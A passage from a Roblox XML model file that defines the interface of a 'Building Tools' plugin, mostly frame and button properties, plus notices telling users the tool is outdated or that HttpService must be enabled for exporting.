											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextButton" referent="RBXCEDEC21C842B434D948D17F3EF388EE3">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<bool name="AutoButtonColor">true</bool>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">0</token>
											<token name="FontSize">0</token>
											<bool name="Modal">false</bool>
											<string name="Name">Button</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<bool name="Selected">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<string name="Text"></string>
											<Color3 name="TextColor3">4279970357</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">8</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">1</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">2</int>
										</Properties>
									</Item>
									<Item class="Frame" referent="RBXC3E40D84224D4104A62D19BFB0D5D5AD">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">0</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">SelectedIndicator</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>6</XO>
												<YS>0</YS>
												<YO>-2</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-5</XO>
												<YS>0</YS>
												<YO>2</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
						</Item>
						<Item class="Frame" referent="RBX87DF7ED7E77F4E8F960F2632DC7A20DB">
							<Properties>
								<bool name="Active">false</bool>
								<Vector2 name="AnchorPoint">
									<X>0</X>
									<Y>0</Y>
								</Vector2>
								<Color3 name="BackgroundColor3">4294967295</Color3>
								<float name="BackgroundTransparency">1</float>
								<Color3 name="BorderColor3">4279970357</Color3>
								<int name="BorderSizePixel">0</int>
								<bool name="ClipsDescendants">false</bool>
								<bool name="Draggable">true</bool>
								<string name="Name">BTStartupNotificationContainer</string>
								<Ref name="NextSelectionDown">null</Ref>
								<Ref name="NextSelectionLeft">null</Ref>
								<Ref name="NextSelectionRight">null</Ref>
								<Ref name="NextSelectionUp">null</Ref>
								<UDim2 name="Position">
									<XS>0</XS>
									<XO>210</XO>
									<YS>0</YS>
									<YO>0</YO>
								</UDim2>
								<float name="Rotation">0</float>
								<bool name="Selectable">false</bool>
								<Ref name="SelectionImageObject">null</Ref>
								<UDim2 name="Size">
									<XS>0</XS>
									<XO>300</XO>
									<YS>0</YS>
									<YO>0</YO>
								</UDim2>
								<token name="SizeConstraint">0</token>
								<token name="Style">0</token>
								<bool name="Visible">true</bool>
								<int name="ZIndex">1</int>
							</Properties>
							<Item class="Frame" referent="RBXDAC9EE059B354E9EABF7110B654A67E3">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4278190080</Color3>
									<float name="BackgroundTransparency">0.699999988</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">ToolUpdateNotification</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>65</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBXD41829EF823F4B0AB30E4B3F5C13F80E">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294945280</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Bar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXB04C8DFC5D844C8AB6CBD5BE2A25F7C3">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.800000012</float>
										<Color3 name="BorderColor3">4278190080</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">OKButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-22</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0.5</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">GOT IT</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX4BAF3381909541448C979868125DEE81">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.800000012</float>
										<Color3 name="BorderColor3">4278190080</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">HelpButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0.5</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-22</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0.5</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">WHAT CAN I DO?</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX5FA839BAEEA54BC1A94B676AA6072193">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.75</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ButtonSeparator</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0.5</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-22</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>1</XO>
											<YS>0</YS>
											<YO>22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX24159FC185E84B4D974FD3E5908FA33A">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Notice</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBX731AB1D693A749DD9FB4DCD73DB59CEE">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4278190080</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">4</token>
											<token name="FontSize">5</token>
											<string name="Name">TextLabel</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">This version of Building Tools is outdated.</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">14</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">0.800000012</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">true</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="IntValue" referent="RBXF86FBE1723A840D8BA11817FF41BF3DA">
										<Properties>
											<string name="Name">NotificationSize</string>
											<int name="Value">-63</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX5D18B626833645BD8FB8D63F493ED10F">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Help</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBX91C702361239427780005D99277D0EF0">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4278190080</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">4</token>
											<token name="FontSize">5</token>
											<string name="Name">TextLabel</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>20</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-20</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">Own this place? Simply reinsert the Building Tools model.</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">14</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">0.800000012</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">true</bool>
											<token name="TextXAlignment">0</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="IntValue" referent="RBXB2C94EFFA509431A9F9C09DA169EDFFE">
										<Properties>
											<string name="Name">NotificationSize</string>
											<int name="Value">-48</int>
										</Properties>
									</Item>
									<Item class="TextLabel" referent="RBXD5C5741BFF2E48DEA510E8A1B1EB490C">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4278190080</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">3</token>
											<token name="FontSize">5</token>
											<string name="Name">TextLabel</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>60</XO>
												<YS>0</YS>
												<YO>7</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-20</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">Otherwise, tell the owner to do the above.</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">14</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">0.800000012</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">true</bool>
											<token name="TextXAlignment">0</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
							</Item>
							<Item class="Frame" referent="RBXBFBB5A3CFE8F4EAA874E130A51C2796D">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4278190080</Color3>
									<float name="BackgroundTransparency">0.699999988</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">HttpDisabledWarning</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>1</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>80</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">false</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX2F24C344473948D5B0828FB17A5C510F">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294901764</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Bar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX0144C2C493F04542B269960D1A3C60CD">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.800000012</float>
										<Color3 name="BorderColor3">4278190080</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">OKButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-22</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0.5</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">GOT IT</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXB317852C89504FE9879399C251AB6EF9">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.800000012</float>
										<Color3 name="BorderColor3">4278190080</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">1</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">HelpButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0.5</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-22</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0.5</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">WHAT CAN I DO?</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX6893953A4BC944499E5856442E78DA30">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.75</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ButtonSeparator</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0.5</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-22</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>1</XO>
											<YS>0</YS>
											<YO>22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX926AE6366EC340C797209E9AC2F78D87">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Notice</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-22</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBX82BC94B8494F487485B90F69857549F5">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4278190080</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">4</token>
											<token name="FontSize">5</token>
											<string name="Name">TextLabel</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">HttpService must be enabled for some features of Building Tools to work, including exporting.</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">14</float>
